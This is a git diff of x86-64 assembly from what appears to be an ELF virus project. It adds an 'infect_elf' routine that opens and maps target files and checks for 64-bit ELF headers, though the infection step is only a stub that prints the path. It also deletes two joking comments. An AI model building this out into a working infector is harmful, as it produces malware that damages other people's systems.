@@ -91,6 +91,28 @@ puts:
 	leave
 	ret
 
+infect_elf:		; r8:elf_struc
+	enter 0, 0
+	mov r8, rdi
+	mov rax, QWORD[r8 + elf_struc.stat + stat.st_size]
+	cmp rax, 64
+	jl infect_elf_end
+	mov rdi, QWORD[r8 + elf_struc.ptr]
+	mov QWORD[r8 + elf_struc.ehdr], rdi
+
+	mov rdi, QWORD[r8 + elf_struc.ehdr]
+	mov dil, BYTE[rdi + ehdr.ei_class]
+	cmp dil, 2
+	jne infect_elf_end 
+
+
+	mov rdi, QWORD[r8 + elf_struc.path]
+	call puts
+	
+	infect_elf_end:
+	leave
+	ret
+
 process_file:
 	enter 0, 0
 	sub rsp, ELF_STRUC_SIZE
@@ -121,7 +143,6 @@ process_file:
 	cmp eax, FILE_MODE
 	jne process_file_end
 
-	;ICI COMMENCE LA GUEEEEERRE
 	mov rdi, QWORD[rsp + elf_struc.path]
 	mov rsi, OPEN_FILE_PERMISSION
 	mov rax, sys_open
@@ -149,11 +170,8 @@ process_file:
 	jl close_file
 	;infect routine
 
-	mov rdi, QWORD[rsp + elf_struc.path]
-	call puts
-	mov rdi, QWORD[rsp + elf_struc.ptr]
-	call puts
-	print_nl
+	mov rdi, rsp
+	call infect_elf
 
 	;end of infect routine
 	mov rdi, QWORD[rsp + elf_struc.ptr]
@@ -162,8 +180,7 @@ process_file:
 	mov rax, sys_munmap			;munmap the file
 	syscall
 	padding
-	;LA GUERRE EST FINIS, GUILHEM T'AS GAGNé !! <3 peace out loseeeers you got c0r0n4v1rus3d(1nf3ct3d) xX_DarkSasukeLolDe42_Xx
-	;ps: si qlqun lit ca un jour il est 4h du matin et je gere pas a 100% l'assembleur d'ou la vente de la peau de l'ours avant son meurtre
+
 	close_file:
 	mov edi, DWORD[rsp + elf_struc.fd]
 	mov rax, sys_close
